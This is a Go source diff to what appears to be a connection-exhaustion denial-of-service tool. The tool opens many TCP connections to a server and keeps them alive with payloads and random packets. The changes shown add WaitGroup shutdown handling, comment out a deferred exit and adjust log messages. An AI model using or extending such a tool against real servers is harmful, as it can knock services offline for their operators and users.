@@ -17,6 +17,7 @@ import (
 )
 
 var lock = &sync.Mutex{}
+var wg = &sync.WaitGroup{}
 
 type attackParams struct {
 	serverURL   *url.URL
@@ -93,11 +94,10 @@ func main() {
 	currConnections := uint64(0)
 	attack.currConn = &currConnections
 
-	defer func() {
-		// close(quit)
-		quit <- true
-		log.Println("Exiting the program")
-	}()
+	// defer func() {
+	// close(quit)
+	// log.Println("Exiting the program")
+	// }()
 
 	i := 1
 	for ; i <= cons; i++ {
@@ -132,6 +132,10 @@ func main() {
 	go monitor(attack, endpoint, i, dial, quit)
 
 	time.Sleep(time.Second * time.Duration(*attack.duration))
+	wg.Add(int(*attack.currConn) + 1)
+	close(quit)
+	wg.Wait()
+	log.Println("<-- Exiting the program")
 }
 
 // starts a new routine that continuously sends packets to the server
@@ -140,11 +144,12 @@ func (m *connection) start(counter, timeout *uint64, quit chan bool) {
 	log.Printf("Starting worker for #%d socket\n", m.id)
 
 	defer func() {
+		log.Printf("<-- Stop sending random packets to #%d socket\n", m.id)
 		m.conn.Close()
-		log.Printf("Stop sending random packets to #%d socket\n", m.id)
+		wg.Done()
 	}()
 
-	log.Printf("Sending initial payload to #%d socket\n", m.id)
+	log.Printf("--> Sending initial payload to #%d socket\n", m.id)
 	packet := []byte(*m.payload)
 	_, err := m.conn.Write(packet)
 	if err != nil {
@@ -173,13 +178,17 @@ func (m *connection) start(counter, timeout *uint64, quit chan bool) {
 				return
 			}
 
-			log.Printf("Sent random packet to #%d socket\n", m.id)
+			log.Printf("--> Sent random packet to #%d socket\n", m.id)
 		}
 	}
 }
 
 // tries to create as much tcp connections as possible
 func monitor(attack *attackParams, address *net.TCPAddr, id int, dial func() (net.Conn, error), quit chan bool) {
+	defer func() {
+		log.Println("<-- Stop running the monitoring routine")
+		wg.Done()
+	}()
 	retry := time.Second * time.Duration(*attack.timeout)
 
 	for {
